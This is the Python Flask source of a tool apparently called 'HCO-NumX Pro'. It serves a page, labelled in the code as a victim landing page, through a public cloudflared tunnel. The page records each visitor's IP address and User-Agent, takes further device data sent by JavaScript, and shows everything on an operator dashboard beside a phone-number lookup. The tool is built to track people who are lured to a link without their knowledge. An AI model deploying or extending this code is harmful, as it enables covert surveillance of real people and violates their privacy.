import os, threading, subprocess, time
from flask import Flask, render_template, request
from utils import lookup_number, get_device_info

app = Flask(__name__)
victim_data = {}

# 🔐 Show tool name + redirect to YouTube
def show_warning_and_redirect():
    os.system("clear")
    print("\033[1;32m[ HCO-NumX Pro ]\033[0m\n")
    print("🔒 This is NOT a free tool!")
    print("🔗 Redirecting to our YouTube channel to unlock usage...")
    time.sleep(8)
    os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input("\n✅ After subscribing, press Enter to continue...")

# 🌐 Home Page (Victim landing page)
@app.route('/')
def index():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    victim_data[ip] = get_device_info(ua)  # fallback if JS fails
    return render_template("index.html")

# 📥 Advanced data collection from JS
@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    ip = request.remote_addr
    victim_data[ip] = data
    return '', 204

# 📊 Dashboard for user
@app.route('/dashboard')
def dashboard():
    return render_template("dashboard.html", data=victim_data)

# 🔎 Lookup phone number manually
@app.route('/lookup', methods=['POST'])
def lookup():
    number = request.form.get('number')
    result = lookup_number(number)
    return result

# 🚀 Cloudflare tunnel in background
def start_cloudflared():
    os.system("pkill cloudflared >/dev/null 2>&1")
    subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://localhost:5000'], stdout=subprocess.DEVNULL)

# ▶️ Start tool
if __name__ == '__main__':
    show_warning_and_redirect()
    threading.Thread(target=start_cloudflared).start()
    app.run(host='0.0.0.0', port=5000)
